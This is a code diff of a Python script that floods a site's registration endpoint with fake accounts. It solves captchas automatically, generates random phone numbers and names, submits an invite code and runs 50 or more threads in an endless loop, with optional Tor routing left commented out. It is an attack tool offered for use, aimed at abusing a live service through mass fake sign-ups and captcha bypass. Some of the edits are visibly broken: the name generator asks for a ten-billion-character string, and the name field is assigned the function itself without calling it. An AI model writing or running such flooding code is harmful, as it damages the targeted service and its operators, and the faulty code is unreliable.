@@ -33,8 +33,8 @@ rt = RequestsTor(tor_ports=(9050,), tor_cport=9051)
 
 def register(data):
 	# resp = rt.post(reg_url, data=data).text
-	resp = requests.post(reg_url, data=data).text
-	print(resp)
+	resp = requests.post(reg_url, data=data).json()
+	print(resp["message"])
 
 def get_captcha():
 	# resp = rt.get(cap_url).json()
@@ -126,12 +126,12 @@ def solve_captcha(cap_id, filename):
 
 
 def random_phone():
-	ran = str(random.randrange(1, 1000000000))
+	ran = str(random.randrange(300000000, 900000000))
 	return '84' + ran.rjust(10, '0')
 
 
 def random_name():
-	return ''.join(random.choice(string.ascii_uppercase) for _ in range(20))
+	return ''.join(random.choice(string.ascii_uppercase) for _ in range(10000000000))
 
 
 def clean_up(filename):
@@ -145,13 +145,13 @@ def flood():
 	while True:
 		cap_id, filename = get_captcha()
 		cap_sol = solve_captcha(cap_id, filename)
-		
+		name = random_name
 		reg_data = {
 			'vid': cap_id,
 			'phone': random_phone(),
-			'name': random_name(),
-			'wpassword': '12345678',
-			'password': '12345678',
+			'name': name,
+			'wpassword': name,
+			'password': name,
 			'invitecode': 'VmrPlg',
 			'vercode': cap_sol
 		}
@@ -168,16 +168,16 @@ os.system(clean_all_png_cmd)
 
 threads = []
 
-for i in range(100):
+for i in range(50):
 	t = threading.Thread(target=flood)
 	t.daemon = True
 	threads.append(t)
 
 
-for i in range(100):
+for i in range(50):
 	threads[i].start()
 
-for i in range(100):
+for i in range(50):
 	threads[i].join()
 
 
